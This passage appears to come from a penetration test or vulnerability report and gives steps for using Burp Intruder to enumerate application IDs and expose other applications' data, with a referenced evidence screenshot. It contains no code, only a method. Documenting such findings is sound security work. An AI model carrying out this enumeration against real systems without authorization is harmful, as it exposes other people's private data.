4. In Burp Intruder, identify the dynamic portion of the application ID in the intercepted request. This will typically be the part of the ID that varies across different applications. Pay attention to any segments of the ID that remain constant.

5. Set the varying parts of the ID as payload positions in Burp Intruder, and configure the attack to target those specific patterns.

(For reference, you can see an example setup in the screenshot below.)

![application-id-enum-intruder-setup](Evidence/application-id-enum-intruder-setup.png)

6. Start the attack, and observe that Burp Intruder successfully enumerates a range of application IDs, showing both accessible and potentially unauthorized application data.
